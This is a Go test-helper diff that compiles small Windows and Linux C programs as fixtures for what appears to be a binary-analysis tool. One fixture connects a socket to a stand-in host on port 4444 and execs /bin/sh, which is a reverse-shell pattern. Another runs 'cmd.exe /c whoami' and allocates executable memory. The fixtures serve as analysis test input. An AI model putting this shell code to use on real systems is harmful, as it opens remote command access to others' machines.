@@ -146,3 +146,47 @@ func StripUPXMarkers(t testing.TB, packed string) string {
 	}
 	return out
 }
+
+// CompileWindows builds a small Windows program with MinGW-w64 and returns its
+// path (skipping the test when the cross compiler is not installed). It is
+// only ever analysed, never run.
+func CompileWindows(t testing.TB, name, src string, flags ...string) string {
+	t.Helper()
+	cc, err := exec.LookPath("x86_64-w64-mingw32-gcc")
+	if err != nil {
+		t.Skip("x86_64-w64-mingw32-gcc not installed")
+	}
+	dir := t.TempDir()
+	in := filepath.Join(dir, name+".c")
+	if err := os.WriteFile(in, []byte(src), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	out := filepath.Join(dir, name+".exe")
+	args := append(append([]string{}, flags...), "-o", out, in)
+	if b, err := exec.Command(cc, args...).CombinedOutput(); err != nil { //nolint:gosec // fixed test tool
+		t.Skipf("cannot build %s: %v\n%s", name, err, b)
+	}
+	return out
+}
+
+// WindowsImportsProgram calls CreateProcessA, VirtualAlloc, LoadLibraryA and
+// GetProcAddress from main, so a call-site resolver has known answers.
+func WindowsImportsProgram(t testing.TB) string {
+	t.Helper()
+	return CompileWindows(t, "winimports", `#include <windows.h>
+static void launch(void){ STARTUPINFOA si={sizeof si}; PROCESS_INFORMATION pi; CreateProcessA(NULL,"cmd.exe /c whoami",NULL,NULL,FALSE,0,NULL,NULL,&si,&pi); }
+static void alloc(void){ void*p=VirtualAlloc(NULL,4096,MEM_COMMIT,PAGE_EXECUTE_READWRITE); if(p) VirtualFree(p,0,MEM_RELEASE); }
+int main(int argc,char**argv){ if(argc>1) launch(); alloc(); HMODULE h=LoadLibraryA("user32.dll"); if(h) GetProcAddress(h,"MessageBoxA"); return 0; }
+`, "-O1")
+}
+
+// LinuxNetworkProgram calls socket, connect and execl from main.
+func LinuxNetworkProgram(t testing.TB) string {
+	t.Helper()
+	return CompileC(t, "linuxnet", `#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <unistd.h>
+int main(void){ int s=socket(AF_INET,SOCK_STREAM,0); struct sockaddr_in a={0}; a.sin_family=AF_INET; a.sin_port=htons(4444); inet_pton(AF_INET,"203.0.113.9",&a.sin_addr); connect(s,(void*)&a,sizeof a); dup2(s,0); execl("/bin/sh","sh",(char*)0); return 0; }
+`, "-O1")
+}
